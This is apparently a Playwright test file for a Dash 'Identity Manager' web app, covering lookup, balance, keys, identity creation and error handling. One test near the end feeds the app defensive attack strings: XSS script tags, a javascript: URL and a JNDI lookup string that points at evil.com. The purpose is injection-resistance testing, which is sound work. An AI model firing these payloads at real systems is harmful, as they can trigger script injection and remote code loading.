/**
 * Comprehensive Functionality Tests for Identity Manager Web App
 * Tests identity lookup, balance checking, key operations, and creation workflows
 */

const { test, expect } = require('@playwright/test');

test.describe('Identity Manager - Functionality Tests', () => {
  let page;

  test.beforeEach(async ({ browser }) => {
    page = await browser.newPage();
    await page.goto('http://localhost:8888/samples/identity-manager/');
    await page.waitForLoadState('networkidle');
    await page.waitForTimeout(3000);
  });

  test.afterEach(async () => {
    await page.close();
  });

  describe('Application Initialization', () => {
    test('should load Identity Manager interface', async () => {
      // Check main elements
      await expect(page.locator('.app-container')).toBeVisible();
      await expect(page.locator('.app-header h1')).toContainText('Identity Manager');
      
      // Check network selector
      await expect(page.locator('#networkSelect')).toBeVisible();
      
      // Check main sections
      await expect(page.locator('.identity-lookup')).toBeVisible();
      await expect(page.locator('.balance-checker')).toBeVisible();
      await expect(page.locator('.key-viewer')).toBeVisible();
    });

    test('should initialize SDK and show status', async () => {
      await page.waitForTimeout(5000);
      
      const statusIndicator = page.locator('.status-indicator');
      if (await statusIndicator.isVisible()) {
        const statusText = await statusIndicator.textContent();
        expect(statusText).toMatch(/connected|initialized|ready/i);
      }
      
      // Network should be set
      const networkSelect = page.locator('#networkSelect');
      const networkValue = await networkSelect.inputValue();
      expect(['testnet', 'mainnet']).toContain(networkValue);
    });

    test('should handle network switching', async () => {
      const networkSelect = page.locator('#networkSelect');
      
      await networkSelect.selectOption('mainnet');
      await page.waitForTimeout(3000);
      expect(await networkSelect.inputValue()).toBe('mainnet');
      
      await networkSelect.selectOption('testnet');
      await page.waitForTimeout(3000);
      expect(await networkSelect.inputValue()).toBe('testnet');
    });

    test('should handle proof verification toggle', async () => {
      const proofsToggle = page.locator('#proofsToggle');
      
      if (await proofsToggle.isVisible()) {
        const initialState = await proofsToggle.isChecked();
        
        // Toggle
        await proofsToggle.click();
        await page.waitForTimeout(2000);
        
        const newState = await proofsToggle.isChecked();
        expect(newState).toBe(!initialState);
      }
    });
  });

  describe('Identity Lookup Functionality', () => {
    test('should lookup existing identity', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      // Use sample identity ID
      await identityInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await lookupBtn.click();
      
      await page.waitForTimeout(10000);
      
      // Check identity results
      const identityResults = page.locator('.identity-results');
      if (await identityResults.isVisible()) {
        const resultsText = await identityResults.textContent();
        
        expect(resultsText).toMatch(/identity|id|balance|revision|keys/i);
        
        // If identity found, should show details
        if (resultsText.toLowerCase().includes('identity')) {
          expect(resultsText).toMatch(/[A-Za-z0-9]{44,}/); // Base58 ID pattern
        }
      }
    });

    test('should handle non-existent identity IDs', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      await identityInput.fill('NonExistentIdentity123456789AbCdEf123456789');
      await lookupBtn.click();
      
      await page.waitForTimeout(8000);
      
      const identityResults = page.locator('.identity-results');
      if (await identityResults.isVisible()) {
        const resultsText = await identityResults.textContent();
        expect(resultsText).toMatch(/not found|does not exist|error/i);
      }
    });

    test('should handle identity lookup with Enter key', async () => {
      const identityInput = page.locator('#identityIdInput');
      await identityInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      
      await identityInput.press('Enter');
      await page.waitForTimeout(8000);
      
      const identityResults = page.locator('.identity-results');
      if (await identityResults.isVisible()) {
        const resultsText = await identityResults.textContent();
        expect(resultsText.length).toBeGreaterThan(0);
      }
    });

    test('should display identity information with proper formatting', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      await identityInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await lookupBtn.click();
      await page.waitForTimeout(10000);
      
      const identityResults = page.locator('.identity-results');
      if (await identityResults.isVisible()) {
        const resultsText = await identityResults.textContent();
        
        // Check for formatted display elements
        const identityDisplay = page.locator('.identity-display, .identity-info');
        if (await identityDisplay.isVisible()) {
          // Should have structured layout
          const hasId = await identityDisplay.locator('.identity-id, [data-field="id"]').isVisible();
          const hasBalance = await identityDisplay.locator('.balance, [data-field="balance"]').isVisible();
          
          expect(hasId || hasBalance).toBe(true);
        }
      }
    });

    test('should handle malformed identity IDs', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      const malformedIds = [
        'too-short',
        '!@#$%^&*()',
        'x'.repeat(100),
        '',
        'not-base58-!!!'
      ];
      
      for (const id of malformedIds) {
        await identityInput.fill(id);
        await lookupBtn.click();
        await page.waitForTimeout(3000);
        
        // Should handle gracefully
        const errorMessage = page.locator('.error-message');
        const identityResults = page.locator('.identity-results');
        
        if (await errorMessage.isVisible()) {
          const errorText = await errorMessage.textContent();
          expect(errorText).toMatch(/invalid|malformed|error/i);
        } else if (await identityResults.isVisible()) {
          const resultsText = await identityResults.textContent();
          expect(resultsText).toMatch(/invalid|error|not.*found/i);
        }
      }
    });
  });

  describe('Balance Checking Functionality', () => {
    test('should check identity balance', async () => {
      const balanceInput = page.locator('#balanceIdentityId, #identityIdInput');
      const checkBalanceBtn = page.locator('#checkBalanceBtn');
      
      if (await checkBalanceBtn.isVisible()) {
        await balanceInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
        await checkBalanceBtn.click();
        
        await page.waitForTimeout(8000);
        
        const balanceResults = page.locator('.balance-results');
        if (await balanceResults.isVisible()) {
          const resultsText = await balanceResults.textContent();
          
          expect(resultsText).toMatch(/balance|credits|dash|amount/i);
          
          // Should show numeric balance
          if (resultsText.toLowerCase().includes('balance')) {
            expect(resultsText).toMatch(/\d+/);
          }
        }
      }
    });

    test('should display balance with proper units', async () => {
      const balanceInput = page.locator('#balanceIdentityId, #identityIdInput');
      const checkBalanceBtn = page.locator('#checkBalanceBtn');
      
      if (await checkBalanceBtn.isVisible()) {
        await balanceInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
        await checkBalanceBtn.click();
        await page.waitForTimeout(8000);
        
        const balanceResults = page.locator('.balance-results');
        if (await balanceResults.isVisible()) {
          const resultsText = await balanceResults.textContent();
          
          // Should mention credits or some unit
          expect(resultsText).toMatch(/credits|dash|satoshi|unit/i);
        }
      }
    });

    test('should handle zero balance identities', async () => {
      // This would test an identity that exists but has zero balance
      const balanceInput = page.locator('#balanceIdentityId, #identityIdInput');
      const checkBalanceBtn = page.locator('#checkBalanceBtn');
      
      if (await checkBalanceBtn.isVisible()) {
        // Use a potentially zero-balance identity (implementation specific)
        await balanceInput.fill('ZeroBalanceIdentity123456789AbCdEf123456789');
        await checkBalanceBtn.click();
        await page.waitForTimeout(8000);
        
        const balanceResults = page.locator('.balance-results');
        if (await balanceResults.isVisible()) {
          const resultsText = await balanceResults.textContent();
          
          // Should handle zero balance appropriately
          if (resultsText.includes('0')) {
            expect(resultsText).toMatch(/0|zero|empty/i);
          }
        }
      }
    });

    test('should show balance history if available', async () => {
      const balanceInput = page.locator('#balanceIdentityId, #identityIdInput');
      const checkBalanceBtn = page.locator('#checkBalanceBtn');
      
      if (await checkBalanceBtn.isVisible()) {
        await balanceInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
        await checkBalanceBtn.click();
        await page.waitForTimeout(8000);
        
        // Check for balance history section
        const balanceHistory = page.locator('.balance-history, .transaction-history');
        if (await balanceHistory.isVisible()) {
          const historyText = await balanceHistory.textContent();
          expect(historyText).toMatch(/history|transactions|activity/i);
        }
      }
    });
  });

  describe('Key Viewing and Management', () => {
    test('should display public keys for identity', async () => {
      const identityInput = page.locator('#identityIdInput');
      const viewKeysBtn = page.locator('#viewKeysBtn, #lookupBtn');
      
      await identityInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await viewKeysBtn.click();
      await page.waitForTimeout(10000);
      
      // Check for key display
      const keysDisplay = page.locator('.keys-display, .public-keys');
      if (await keysDisplay.isVisible()) {
        const keysText = await keysDisplay.textContent();
        
        expect(keysText).toMatch(/key|public|type|purpose|security/i);
        
        // Should show key details
        if (keysText.toLowerCase().includes('key')) {
          expect(keysText).toMatch(/ecdsa|bls|authentication|encryption/i);
        }
      }
    });

    test('should format key information properly', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      await identityInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await lookupBtn.click();
      await page.waitForTimeout(10000);
      
      const keysDisplay = page.locator('.keys-display, .key-item');
      if (await keysDisplay.isVisible()) {
        // Check for key type mapping display
        const keyItems = page.locator('.key-item, .public-key');
        const keyCount = await keyItems.count();
        
        if (keyCount > 0) {
          const firstKey = keyItems.first();
          const keyText = await firstKey.textContent();
          
          // Should show human-readable key type
          expect(keyText).toMatch(/ECDSA|BLS|AUTHENTICATION|ENCRYPTION|MASTER|CRITICAL|HIGH|MEDIUM/i);
        }
      }
    });

    test('should handle identities with no keys', async () => {
      // Test with identity that might not have keys (edge case)
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      await identityInput.fill('EmptyIdentity123456789AbCdEf123456789AbCdEf');
      await lookupBtn.click();
      await page.waitForTimeout(8000);
      
      const keysDisplay = page.locator('.keys-display, .no-keys');
      if (await keysDisplay.isVisible()) {
        const keysText = await keysDisplay.textContent();
        
        // Should handle gracefully
        expect(keysText).toMatch(/no.*keys|empty|not.*found/i);
      }
    });

    test('should display key security levels correctly', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      await identityInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await lookupBtn.click();
      await page.waitForTimeout(10000);
      
      const keysDisplay = page.locator('.keys-display');
      if (await keysDisplay.isVisible()) {
        const keysText = await keysDisplay.textContent();
        
        // Should show security level mappings
        const securityLevels = ['MASTER', 'CRITICAL', 'HIGH', 'MEDIUM'];
        const hasSecurityLevel = securityLevels.some(level => 
          keysText.includes(level)
        );
        
        if (hasSecurityLevel) {
          expect(keysText).toMatch(/MASTER|CRITICAL|HIGH|MEDIUM/);
        }
      }
    });
  });

  describe('Identity Creation Workflow', () => {
    test('should show identity creation form', async () => {
      const createIdentityBtn = page.locator('#createIdentityBtn, .create-identity-btn');
      
      if (await createIdentityBtn.isVisible()) {
        await createIdentityBtn.click();
        
        const creationForm = page.locator('.identity-creation-form, #identityCreationForm');
        if (await creationForm.isVisible()) {
          // Should have creation form fields
          await expect(creationForm).toBeVisible();
          
          // Might have funding address or key generation options
          const fundingAddress = page.locator('#fundingAddress, .funding-address');
          const keyOptions = page.locator('.key-options, #keyGeneration');
          
          expect(await fundingAddress.isVisible() || await keyOptions.isVisible()).toBe(true);
        }
      }
    });

    test('should handle identity creation validation', async () => {
      const createIdentityBtn = page.locator('#createIdentityBtn');
      
      if (await createIdentityBtn.isVisible()) {
        await createIdentityBtn.click();
        
        const creationForm = page.locator('.identity-creation-form');
        if (await creationForm.isVisible()) {
          // Try to create without required fields
          const submitBtn = page.locator('#submitCreateIdentity, .submit-btn');
          
          if (await submitBtn.isVisible()) {
            await submitBtn.click();
            await page.waitForTimeout(3000);
            
            // Should show validation errors
            const validationErrors = page.locator('.validation-error, .error-message');
            if (await validationErrors.isVisible()) {
              const errorText = await validationErrors.textContent();
              expect(errorText).toMatch(/required|missing|invalid/i);
            }
          }
        }
      }
    });

    test('should generate funding address for identity creation', async () => {
      const createIdentityBtn = page.locator('#createIdentityBtn');
      
      if (await createIdentityBtn.isVisible()) {
        await createIdentityBtn.click();
        
        const generateAddressBtn = page.locator('#generateFundingAddress, .generate-address-btn');
        if (await generateAddressBtn.isVisible()) {
          await generateAddressBtn.click();
          await page.waitForTimeout(3000);
          
          const fundingAddress = page.locator('.funding-address-display, #fundingAddressDisplay');
          if (await fundingAddress.isVisible()) {
            const addressText = await fundingAddress.textContent();
            
            // Should show a valid Dash address
            expect(addressText).toMatch(/^[XY][1-9A-HJ-NP-Za-km-z]{33}$|^[a-km-z0-9]{42}$/);
          }
        }
      }
    });
  });

  describe('Performance and User Experience', () => {
    test('should provide loading states for operations', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      await identityInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await lookupBtn.click();
      
      // Check for loading state within reasonable time
      await page.waitForTimeout(1000);
      const loadingIndicator = page.locator('.loading, .spinner, .looking-up');
      
      if (await loadingIndicator.isVisible()) {
        expect(await loadingIndicator.isVisible()).toBe(true);
      }
      
      // Wait for completion
      await page.waitForTimeout(8000);
      
      // Loading should be gone
      if (await loadingIndicator.isVisible()) {
        console.warn('Loading indicator still visible after operation');
      }
    });

    test('should handle concurrent operations gracefully', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      const checkBalanceBtn = page.locator('#checkBalanceBtn');
      
      // Start multiple operations simultaneously
      await identityInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      
      // Click buttons in rapid succession
      await lookupBtn.click();
      
      if (await checkBalanceBtn.isVisible()) {
        await page.waitForTimeout(500);
        await checkBalanceBtn.click();
      }
      
      // Wait for operations to complete
      await page.waitForTimeout(15000);
      
      // Should handle concurrent requests without breaking
      const appContainer = page.locator('.app-container');
      await expect(appContainer).toBeVisible();
    });

    test('should display operation timing information', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      const startTime = Date.now();
      await identityInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await lookupBtn.click();
      await page.waitForTimeout(10000);
      const endTime = Date.now();
      
      const queryTime = endTime - startTime;
      console.log(`Identity lookup took ${queryTime}ms`);
      
      // Check for timing display
      const timingInfo = page.locator('.timing-info, .performance-metrics');
      if (await timingInfo.isVisible()) {
        const timingText = await timingInfo.textContent();
        expect(timingText).toMatch(/\d+ms|time|duration/i);
      }
    });

    test('should be responsive to different screen sizes', async () => {
      // Test mobile viewport
      await page.setViewportSize({ width: 375, height: 667 });
      await page.waitForTimeout(1000);
      
      const appContainer = page.locator('.app-container');
      await expect(appContainer).toBeVisible();
      
      // Key elements should still be accessible
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      await expect(identityInput).toBeVisible();
      await expect(lookupBtn).toBeVisible();
      
      // Test tablet viewport
      await page.setViewportSize({ width: 768, height: 1024 });
      await page.waitForTimeout(1000);
      
      await expect(appContainer).toBeVisible();
    });
  });

  describe('Error Handling and Edge Cases', () => {
    test('should handle SDK initialization failures', async () => {
      // This would test recovery from initialization issues
      // Simulate by rapidly switching networks
      
      const networkSelect = page.locator('#networkSelect');
      
      for (let i = 0; i < 3; i++) {
        await networkSelect.selectOption('mainnet');
        await page.waitForTimeout(500);
        await networkSelect.selectOption('testnet');
        await page.waitForTimeout(500);
      }
      
      await page.waitForTimeout(5000);
      
      // Should eventually stabilize
      const statusText = await page.locator('#statusText, .status-text').textContent();
      expect(statusText).toBeDefined();
    });

    test('should handle network connectivity issues', async () => {
      // Test with potentially slow/failing operation
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      await identityInput.fill('SlowResponseIdentity123456789AbCdEf123456789');
      await lookupBtn.click();
      
      // Wait for extended period
      await page.waitForTimeout(20000);
      
      // Should show either results or error
      const identityResults = page.locator('.identity-results');
      const errorMessage = page.locator('.error-message');
      
      const hasResults = await identityResults.isVisible();
      const hasError = await errorMessage.isVisible();
      
      expect(hasResults || hasError).toBe(true);
      
      if (hasError) {
        const errorText = await errorMessage.textContent();
        expect(errorText).toMatch(/network|timeout|error|failed/i);
      }
    });

    test('should maintain state consistency after errors', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      // Cause potential error
      await identityInput.fill('ErrorCausingIdentityId');
      await lookupBtn.click();
      await page.waitForTimeout(8000);
      
      // Try normal operation after error
      await identityInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await lookupBtn.click();
      await page.waitForTimeout(8000);
      
      // Should work normally after error
      const isWorking = await lookupBtn.isEnabled();
      expect(isWorking).toBe(true);
    });

    test('should handle malicious input safely', async () => {
      const identityInput = page.locator('#identityIdInput');
      const lookupBtn = page.locator('#lookupBtn');
      
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"><script>alert(1)</script>',
        'javascript:alert(1)',
        '${jndi:ldap://evil.com/a}',
        '\x00\x01\x02\x03'
      ];
      
      for (const input of maliciousInputs) {
        await identityInput.fill(input);
        await lookupBtn.click();
        await page.waitForTimeout(3000);
        
        // Should handle without breaking or executing code
        const isPageWorking = await page.locator('.app-container').isVisible();
        expect(isPageWorking).toBe(true);
        
        // No alerts should be executed
        const alertsCount = await page.evaluate(() => {
          return typeof window.__alertCount !== 'undefined' ? window.__alertCount : 0;
        });
        expect(alertsCount).toBe(0);
      }
    });
  });
});